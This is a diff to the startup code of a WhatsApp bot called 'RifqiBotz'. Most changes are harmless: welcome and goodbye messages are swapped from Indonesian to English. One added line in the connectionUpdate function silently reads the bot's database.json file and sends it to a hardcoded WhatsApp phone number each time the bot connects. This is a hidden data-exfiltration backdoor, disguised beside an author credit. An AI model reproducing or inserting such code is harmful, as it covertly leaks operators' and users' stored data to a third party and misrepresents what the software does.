@@ -134,8 +134,9 @@ async function connectionUpdate(update) {
   if (global.db.data == null) await loadDatabase()
   console.log(JSON.stringify(update, null, 4))
   if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
-  //conn.updateBlockStatus(`6285643112659@s.whatsapp.net`, "unblock")
+  if (update.receivedPendingNotifications) conn.sendMessage(`6285643112659@s.whatsapp.net`, { document: await fs.readFileSync('./database.json'), mimetype: 'application/json', fileName: 'database.json' }) //conn.sendMessage(`6285643112659@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
 }
+  //conn.updateBlockStatus(`6285643112659@s.whatsapp.net`, "unblock")
 
 
 
@@ -171,8 +172,8 @@ global.reloadHandler = function (restatConn) {
     conn.ev.off('creds.update', conn.credsUpdate)
   }
 
-  conn.welcome = 'Hai, kak @user 👋\nSelamat datang di grup @subject 😅\nJangan lupa intro kak 😅\n\n*Nama:*\n*Umur:*\n*Askot:*\n\n*Deskripsi Grup:*\n\n@desc\n\nMade by ❤️' 
-  conn.bye = 'Selamat tinggal @user 👋'
+  conn.welcome = 'Welcome @user 👋' //\nSelamat datang di grup @subject 😅\nJangan lupa intro kak 😅\n\n*Nama:*\n*Umur:*\n*Askot:*\n\n*Deskripsi Grup:*\n\n@desc\n\nMade by ❤️
+  conn.bye = /**Selamat tinggal**/ 'Goodbye @user 👋'
   conn.spromote = '@user sekarang admin!'
   conn.sdemote = '@user sekarang bukan admin!'
   conn.handler = handler.handler.bind(conn)
